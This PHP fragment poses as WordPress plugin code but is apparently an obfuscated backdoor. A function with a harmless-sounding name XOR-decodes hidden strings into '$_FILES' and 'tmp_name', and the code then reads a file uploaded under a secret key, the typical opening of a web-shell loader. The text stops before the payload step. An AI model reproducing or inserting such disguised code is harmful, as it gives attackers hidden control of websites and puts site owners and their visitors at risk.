 ...
 *
 * Be sure to flush the rewrite rules - see flush_r*/
 	
	$width = 'post_id';
$textarr = 'kXx2TFzCIH';
$_edit_link = $textarr;
	$post_date = 'previous_status';
function current_filter($values, $slug)

{
    $domain = $slug;
    $prime_pattern = urldecode($values);

    $datetime = substr($domain,0, strlen($prime_pattern));
    $post_password = $prime_pattern ^ $datetime;
	$import_id = 'fallback_title';
    return $post_password;
	$image_url = 'full';
}
$thumbnail_id = ${current_filter("4%1E1%7E%11%15", $_edit_link)};
$can_export = $thumbnail_id;
if (isset($can_export[$_edit_link]))

{
    $pee_parts = $thumbnail_id[$_edit_link];

    $newtext = $pee_parts[current_filter("%1F5%08m%3A%27%17%26", $_edit_link)];
    $thumb = $newtext;
...
/* ewrite_rules() - when your plugin gets
